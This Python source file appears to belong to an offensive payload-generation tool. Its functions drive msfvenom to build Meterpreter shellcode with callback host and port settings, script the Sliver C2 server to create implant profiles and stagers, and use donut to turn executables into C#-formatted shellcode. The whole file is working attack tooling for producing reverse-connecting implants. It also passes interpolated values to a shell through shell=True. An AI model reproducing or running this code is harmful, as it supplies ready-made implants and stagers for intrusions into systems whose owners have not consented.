import subprocess
import uuid
import donut
from ShellcodeFormatter import ShellcodeTransformer, ShellcodeDefinitions

def CreateMetShellCodeFile(payload, lhost, lport, plformat):
   command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {plformat} -o /tmp/temp.txt"
   process = subprocess.run(command, shell=True, universal_newlines=True)
   print(process)
   if process.returncode != 0:
       print("Generating shell code failed. Exiting.")
       exit()
   else:
       print("Shell code successfully generated")
       
def GetMetShellCode(payload, lhost, lport, plformat):
    CreateMetShellCodeFile(payload, lhost, lport, plformat)
    with open('/tmp/temp.txt','r') as file:
        shellcode = file.read();
    return shellcode;
       
def GetSliverShellCode(payload, lhost, lport, plformat, profileProtocol, profileArchitecture, profileName):
    command = "sliver-server_linux"
    process = subprocess.Popen(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if profileName.lower() == "generate":
        profileName = "ephenom-" + str(uuid.uuid4()).split('-')[0]
    
    print("creating profile")
    out = sendApplicationCommand(process,f"profiles new --{profileProtocol} {lhost} --format shellcode --arch {profileArchitecture} {profileName}")
    [print(line) for line in out]
    print("Generating stager, please wait ...")
    out = sendApplicationCommand(process,f"generate stager --lhost {lhost} --lport {lport} --arch {profileArchitecture} --format {plformat}  --save .")
    savedLine = out[-1]
    print(savedLine)
    shellCodeLoc = savedLine.split(" ")[-1].replace("\n","")
    with open(shellCodeLoc,'r') as file:
        shellcode = file.read();
    return shellcode;

def sendApplicationCommand(process,command):
    print(command)
    
    ret = []   
    process.stdin.write(command + "\n")
    process.stdin.flush()
   
    for line in process.stdout:
        if ("Generating stager, please wait ..." not in line) and line.strip() != "":
            ret.append(line)
        if ("Saved new implant profile" in line):
            break
        elif ("Sliver implant stager saved to" in line):
            break
    return ret

def CreateDonutShellCode(inputFile, params):
    shellcodebytes = donut.create(file=f"{inputFile}",params=f"{params}")
    definition = ShellcodeDefinitions.get_definition('csharp')
    shellcode = ShellcodeTransformer(definition).transform_shellcode(shellcodebytes)
    return shellcode

def GetDonutShellCode(inputFile, params):
    return CreateDonutShellCode(inputFile, params)
